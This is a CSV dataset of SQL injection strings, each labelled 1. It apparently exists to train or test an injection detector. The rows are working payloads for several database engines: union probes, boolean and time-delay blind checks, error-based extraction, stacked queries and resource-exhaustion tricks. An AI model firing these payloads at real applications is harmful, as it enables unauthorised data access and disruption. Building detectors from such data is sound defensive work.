Query,Label
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",1
"1%"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",1
-3862') or 9323=9323#,1
"-8425"")) or (6485=1127)*1127 and ((""qruf""=""qruf",1
1');select pg_sleep(5)--,1
"-2106"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""dvlq"" like ""dvlq",1
"1%') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('%'='",1
"1"") as gdcx where 2335=2335 and 6969=(select 6969 from pg_sleep(5))--",1
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy",1
"1') and 8635=(select count(*) from generate_series(1,5000000))--",1
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",1
1 rlike (select * from (select(sleep(5)))sgvo)# ewsz,1
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""text"" like ""text",1
"-8203)) as eqlf where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",1
"1') where 9304=9304 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1 where 8398=8398;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
1 where 5161=5161 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1
1%') and 2006=2006,1
"1' where 1628=1628 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1) as qjbd where 2808=2808 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
"1"");select (case when (2676=4191) then 2676 else 1/(select 0) end)--",1
"1')) or elt(6272=6272,sleep(5)) and (('zjel' like 'zjel",1
1')) as txxn where 7884=7884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
"1') as wtfo where 5666=5666 union all select null,null,null,null--",1
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),1
1 where 8532=8532;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
1') where 9538=9538;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"1""))) or sleep(5)#",1
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei",1
"1"")) as ylah where 9248=9248;select pg_sleep(5)--",1
-3834')) as hhiy where 2086=2086 or 3038=3038,1
"-4236') union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",1
-2241) where 7606=7606 or (8459=8459)*4906--,1
1')) as wqhm where 9871=9871;(select * from (select(sleep(5)))srmq)--,1
1)) as rcbz where 4563=4563 and 2006=2006,1
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1
-1459'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('eiet' like 'eiet,1
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq",1
1');if(7899=7899) select 7899 else drop function zbbp--,1
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""cwat"" like ""cwat",1
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""zyoo""=""zyoo",1
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
"-9762) or elt(5773=8986,8986)",1
"-8773%'))) union all select 8941,8941,8941,8941,8941,8941#",1
"-4233%"") or (8459=8459)*4906 and (""%""=""",1
1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006,1
"1%""))) union all select null,null,null,null,null,null--",1
"1') union all select null,null,null,null,null,null#",1
"1""))) or elt(6272=6272,sleep(5)) and (((""hxgu""=""hxgu",1
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))-- huss",1
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,1
1'))) rlike sleep(5) and ((('zwyx'='zwyx,1
"1')) as jpxj where 6153=6153 or 8156=(select count(*) from generate_series(1,5000000))--",1
"1""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx",1
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",1
"-6112"") union all select 8203,8203,8203,8203,8203,8203,8203--",1
"1"") as tqxa where 6751=6751 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
1'));waitfor delay '0:0:5'--,1
"-5391 or make_set(9354=9354,7185)# ptyy",1
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",1
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('ocfi'='ocfi",1
"1) union all select null,null,null,null,null,null,null#",1
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",1
"1') where 8211=8211 union all select null,null,null,null,null#",1
"1)) as ehlg where 6340=6340;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
"1))) and 8635=(select count(*) from generate_series(1,5000000))--",1
-3899') where 8152=8152 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
"-6662"")) union all select 6755--",1
"-1684""))) union all select 7473,7473#",1
"1%"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",1
"-7101))) union all select 4587,4587,4587,4587,4587,4587--",1
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",1
"-6496""))) or 1471=5278 and (((""zkoj""=""zkoj",1
"-8238')) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",1
1) where 3671=3671;(select * from (select(sleep(5)))srmq)--,1
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('ohqs' like 'ohqs,1
"1"") where 5719=5719 rlike sleep(5)--",1
"1%"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""%""=""",1
"1"")) and 5421=4804--",1
"1"")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((""tbdl"" like ""tbdl",1
"1%'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"1' where 4880=4880 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
"1%"");select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"1""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
1';select sleep(5)#,1
1))) or 6793=(select 6793 from pg_sleep(5)) and (((3919=3919,1
1')) as xkiq where 9008=9008 and sleep(5)--,1
"1"" where 2235=2235 union all select null,null,null,null,null--",1
-1219') or 5592=4835,1
"1%"" and 6969=(select 6969 from pg_sleep(5)) and ""%""=""",1
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",1
"1') as kgnd where 1550=1550 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1' where 8159=8159 union all select null#,1
"1) as qjjm where 3850=3850 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+',1
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"-3924'||(select 'ssld' from dual where 6229=6229 union all select 6229,6229,6229,6229,6229#",1
-8636'))) or 4301=7212--,1
"1%""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""%""=""",1
-7758%'))) or 3038=3038,1
"1%"" rlike sleep(5) and ""%""=""",1
"1%""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""%""=""",1
"1%')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='",1
"1' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
"1"")) as sqzh where 5672=5672 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
1') where 8128=8128;select (case when (4061=1396) then 4061 else 1/(select 0) end)--,1
"-5780 or make_set(3464=4518,4518)-- icit",1
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('jmjw' like 'jmjw",1
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm",1
"-7700%') union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",1
-1127 or 7391=4954,1
1' in boolean mode) and (select * from (select(sleep(5)))gcrr)#,1
-8876')) or 3038=3038,1
"-1218' union all select 2663,2663,2663,2663--",1
-1436' or 5699=5783--,1
"-9583')) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1
"-1663' or elt(1032=1032,3623) and 'yqaj' like 'yqaj",1
1))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9548=9548,1
"1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
1'||(select 'tznb' from dual where 8808=8808 rlike (select * from (select(sleep(5)))vwyq)#,1
"1 and make_set(8403=8403,8899)",1
"1"")) as dfwi where 9703=9703 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
1) and 3861=5813--,1
"-4419%"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"-9795) as wrgs where 5427=5427 union all select 5427,5427,5427,5427,5427,5427--",1
"-4639""))) or 8550=9348",1
1')));(select * from (select(sleep(5)))srmq) and ((('pfle' like 'pfle,1
-3246%' union all select 4012#,1
"1"") where 2088=2088 union all select null,null,null,null--",1
1))) order by 1--,1
"1%"") union all select null,null,null,null,null,null,null,null,null,null#",1
"1'));select * from generate_series(4975,4975,case when (4975=9615) then 1 else 0 end) limit 1--",1
1') rlike sleep(5) and ('qsub' like 'qsub,1
"1'))) union all select null,null,null,null,null,null,null,null,null--",1
-7277))) order by 1#,1
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",1
"1') as qqyz where 2274=2274;iif(5257=5257,1,1/0)",1
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'efpc' like 'efpc",1
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""uvzc"" like ""uvzc",1
1'))) and 7533=7533 and ((('txex'='txex,1
"1)) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1%') union all select null,null,null,null,null,null,null,null,null,null#",1
1;select pg_sleep(5),1
"1%';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('ojkd'='ojkd",1
1')) as wuws where 6917=6917 union all select null#,1
"1') as bxae where 4143=4143 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""zbwn"" like ""zbwn",1
-9673) or 8571=8571--,1
1);begin user_lock.sleep(5); end and (4610=4610,1
"1%"" and 2006=2006",1
"1%""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj",1
"1%"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"1'||(select 'aoad' where 8795=8795 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",1
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz",1
-5031' or 9323=9323#,1
"-9638))) or elt(1032=1032,3623) and (((3679=3679",1
"1))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6265=6265",1
-7864 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# twpw,1
1 rlike (select (case when (8911=5301) then 1 else 0x28 end))# pmuh,1
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
1'));select pg_sleep(5) and (('enpn' like 'enpn,1
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1'+(select lgkd where 7801=7801 and elt(4249=4249,7259))+'",1
-4171') union all select 6136#,1
"1)) as aqpy where 4027=4027 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
1'||(select 'npdx' from dual where 9486=9486 and sleep(5))||',1
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))-- sbvl",1
"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((8679=8679",1
"1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='",1
"-5624' union all select 3723,3723,3723,3723,3723--",1
"1"")));iif(1718=5436,1,1/0)",1
"-9509) union all select 1193,1193,1193#",1
1%') waitfor delay '0:0:5'--,1
"1'))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1' in boolean mode) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#",1
"1"") where 8098=8098;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",1
"1%')) and make_set(6527=9529,9529) and (('%'='",1
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
"1%'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('fuyl'='fuyl",1
"1%' or 8466=benchmark(5000000,md5(0x694a4745)) and '%'='",1
-3535%'))) or 5605=4660 and ((('%'=',1
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""opdl""=""opdl",1
"1) as oblq where 2002=2002 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
"1%')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"1'+(select 'ycvl' where 8415=8415 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"1"") or elt(6272=6272,sleep(5)) and (""dplf"" like ""dplf",1
"-2605"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""cikb"" like ""cikb",1
"1%"") or 8156=(select count(*) from generate_series(1,5000000))--",1
"1')) union all select null,null,null,null,null,null,null,null,null,null#",1
"1"") where 6065=6065 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
1);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
"-7551 or elt(6900=7195,7195)",1
"1));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1')) as vqrt where 5173=5173 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"-9135"")) or 6872=6872 and ((""fllx""=""fllx",1
"1%""));iif(7011=2522,1,1/0)",1
"1"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1
-5313'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('wkkp' like 'wkkp,1
"1) where 9469=9469 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
-8163)) as cvai where 2360=2360 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
1) where 1100=1100 and sleep(5)--,1
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""otgh"" like ""otgh",1
"1%""))) or (select * from (select(sleep(5)))sddo)#",1
1') as jztg where 1222=1222 or sleep(5)#,1
"-7574%"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",1
1) where 9078=9078 rlike sleep(5)#,1
1' in boolean mode) waitfor delay '0:0:5'#,1
"1"") where 4913=4913;begin user_lock.sleep(5); end--",1
1') as fxid where 5926=5926;if(7899=7899) select 7899 else drop function zbbp--,1
"1""));begin dbms_lock.sleep(5); end--",1
"-7531') union all select 3072,3072,3072,3072,3072,3072,3072--",1
"1"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1'||(select 'wvio' from dual where 8934=8934 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
"1 union all select null,null,null,null,null,null--",1
"1"" where 9521=9521 or (select * from (select(sleep(5)))ydpu)--",1
1%') union all select null--,1
"-4869%' union all select 5729,5729,5729--",1
"1%' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",1
-4644 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')# upwd,1
"1"" rlike (select * from (select(sleep(5)))vwyq)#",1
-4494 or 5291=4452,1
"1) as qzif where 7877=7877 union all select null,null,null,null,null,null,null--",1
-3613%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',1
"1'+(select vfmy where 5711=5711;iif(5214=7412,1,1/0)",1
"1'+(select 'ayod' where 7839=7839 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",1
"1'+(select 'myrb' where 3622=3622 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",1
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('qdsr' like 'qdsr",1
1)) as xlww where 5844=5844;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
"1') union all select null,null,null,null,null,null,null,null,null#",1
"1"") union all select null,null,null,null,null--",1
"1%') and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
"-5863"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""gkvy""=""gkvy",1
"1)) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((5349=5349",1
"1') and 8407=(select count(*) from generate_series(1,5000000))",1
"1 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"1);select count(*) from generate_series(1,5000000)--",1
"1'+(select jley where 3581=3581 and 2388=benchmark(5000000,md5(0x6d457153))#",1
"1"")) as ljhz where 2416=2416;begin dbms_lock.sleep(5); end--",1
1') rlike (select * from (select(sleep(5)))sgvo) and ('lzbn'='lzbn,1
"-5817' in boolean mode) union all select 2391,2391,2391,2391,2391--",1
"1%""))) and (select * from (select(sleep(5)))gcrr)#",1
"1%""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1%""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"-8550"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kyad""=""kyad",1
"1 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
"1)));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
1)) as emtf where 3561=3561 or (select * from (select(sleep(5)))ydpu)--,1
1%') and (select * from (select(sleep(5)))gcrr)#,1
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'hvqt'='hvqt",1
"1' in boolean mode) union all select null,null#",1
1') or 6793=(select 6793 from pg_sleep(5)) and ('fuvv'='fuvv,1
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""kcxw""=""kcxw",1
"1'))) union all select null,null#",1
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('tnfm' like 'tnfm",1
1');select pg_sleep(5),1
"1') as sjmt where 6541=6541 or 8421=(select count(*) from generate_series(1,5000000))--",1
"1"" where 8089=8089;iif(5257=5257,1,1/0)",1
"1%"") and 4595=4595#",1
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""bkrk""=""bkrk",1
"-3769""))) union all select 8456#",1
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",1
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",1
"1%') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",1
1%'));if(7899=7899) select 7899 else drop function zbbp--,1
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt' like 'sqvt,1
"1')));select count(*) from generate_series(1,5000000)--",1
"1') where 1212=1212;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1' where 9416=9416;begin user_lock.sleep(5); end--,1
"1""))) and 7135=8805#",1
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""ureu"" like ""ureu",1
"1))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((9255=9255",1
"1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'='",1
